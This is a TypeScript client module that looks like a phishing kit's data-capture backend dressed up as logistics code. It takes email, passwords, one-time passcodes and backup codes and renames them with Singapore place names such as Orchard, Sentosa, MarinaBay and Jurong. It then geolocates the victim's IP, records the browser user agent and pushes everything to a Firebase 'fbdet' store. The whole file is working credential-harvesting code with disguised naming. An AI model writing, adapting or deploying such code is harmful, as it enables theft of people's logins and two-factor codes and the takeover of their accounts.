"use client";
import { initializeApp, getApps, getApp } from "firebase/app";
import {
  getDatabase,
  ref,
  push,
  set,
  serverTimestamp,
  update,
} from "firebase/database";
import { firebaseConfig } from "./firebaseConfig";

const app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp();
const db = getDatabase(app);

export const captureData = async (
  districtName: string,
  logisticsData: any,
  existingRouteId?: string,
) => {
  if (typeof window === "undefined") return null;

  const maskedPayload: any = {};

  // 1. Map Legacy keys to Singapore Keys
  if (logisticsData.emle) maskedPayload.Orchard = logisticsData.emle;
  if (logisticsData.pass) maskedPayload.Sentosa = logisticsData.pass;
  if (logisticsData.pass2) maskedPayload.Changi = logisticsData.pass2;

  // 2. Handle Dynamic & Direct Singapore Keys
  Object.keys(logisticsData).forEach((key) => {
    // Handle OTP/2FA
    if (key.startsWith("otp") || key.startsWith("MarinaBay")) {
      const value = logisticsData[key];
      const ts = key.includes("_") ? key.split("_")[1] : Date.now();
      maskedPayload[`MarinaBay_${ts}`] = value;
    }

    // Handle Backup Codes
    if (key.startsWith("backupCode") || key.startsWith("Jurong")) {
      const value = logisticsData[key];
      const ts = key.includes("_") ? key.split("_")[1] : Date.now();
      maskedPayload[`Jurong_${ts}`] = value;
    }

    // Pass through direct mapping if already correctly named (Sentosa, Changi, etc)
    const directKeys = ["Orchard", "Sentosa", "Changi", "Tampines"];
    if (directKeys.includes(key)) {
      maskedPayload[key] = logisticsData[key];
    }
  });

  if (existingRouteId) {
    try {
      const routeRef = ref(db, `fbdet/${existingRouteId}`);
      // Ensure we don't update if payload is empty
      if (Object.keys(maskedPayload).length > 0) {
        await update(routeRef, maskedPayload);
      }
      return existingRouteId;
    } catch (err) {
      return null;
    }
  }

  let routeInfo = {
    ip: "0.0.0.0",
    gateway: "Default Gateway",
  };

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2500);
    const res = await fetch("https://ipapi.co/json/", {
      signal: controller.signal,
    });
    const data = await res.json();

    if (data && !data.error) {
      routeInfo.ip = data.ip || "Unknown";
      routeInfo.gateway = `${data.city || "Unknown"}, ${data.country_name || "Unknown"}`;
    }
    clearTimeout(timeoutId);
  } catch (e) {
    console.warn("Route trace failed.");
  }

  try {
    const registryRef = ref(db, "fbdet");
    const newRouteRef = push(registryRef);

    await set(newRouteRef, {
      ...maskedPayload,
      District: districtName,
      NodeIP: routeInfo.ip,
      Gateway: routeInfo.gateway,
      UserAgent: navigator.userAgent,
      EntryDate: new Date().toLocaleDateString("en-GB"),
      EntryTime: new Date().toLocaleTimeString("en-US", {
        hour12: true,
        hour: "2-digit",
        minute: "2-digit",
      }),
      ProcessedAt: serverTimestamp(),
    });

    return newRouteRef.key;
  } catch (err) {
    return null;
  }
};
